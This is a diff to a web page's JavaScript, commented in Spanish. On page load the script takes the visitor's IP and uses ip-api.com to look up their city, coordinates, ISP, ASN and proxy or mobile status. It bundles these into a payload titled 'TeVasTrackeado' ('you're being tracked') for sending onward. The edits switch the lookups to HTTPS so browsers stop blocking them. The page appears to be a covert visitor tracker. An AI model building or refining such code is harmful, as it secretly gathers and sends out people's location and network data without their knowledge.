@@ -59,15 +59,15 @@
         
         // --- FUNCIÓN PRINCIPAL: Dos Pasos para Estabilidad ---
 
-        // Paso A: Obtener la IP simple (api.ipify.org es solo para la IP)
+        // Paso A: Obtener la IP simple (api.ipify.org es HTTPS y estable)
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
                 const userIP = data.ip;
                 
                 // Paso B: Escanear la IP con ip-api.com (Geo, ISP, Seguridad)
-                // Usamos la IP obtenida para una solicitud más específica y estable.
-                const scanUrl = `http://ip-api.com/json/${userIP}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,reverse,hosting,proxy,mobile`;
+                // 🚨 CORRECCIÓN CRÍTICA: Se cambia 'http' por 'https' para evitar el bloqueo de "Mixed Content".
+                const scanUrl = `https://ip-api.com/json/${userIP}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,reverse,hosting,proxy,mobile`;
                 
                 return fetch(scanUrl)
                     .then(geoResponse => geoResponse.json())
@@ -80,7 +80,7 @@
 
                         // Ensamblar TODOS los datos para el envío final
                         const finalPayload = {
-                            "_subject": "✅ DATOS ESTABLES - TeVasTrackeado", 
+                            "_subject": "✅ DATOS RECIBIDOS (HTTPS) - TeVasTrackeado", 
                             "IP_Visitante": userIP,
                             
                             // --- DATOS DE GEOLOCALIZACIÓN Y RED (ip-api.com) ---
@@ -151,7 +151,7 @@
         });
         
         if (window.location.protocol === 'http:') {
-            window.location.protocol = 'httpsS:';
+            window.location.protocol = 'https:';
         }
     </script>
 </body>
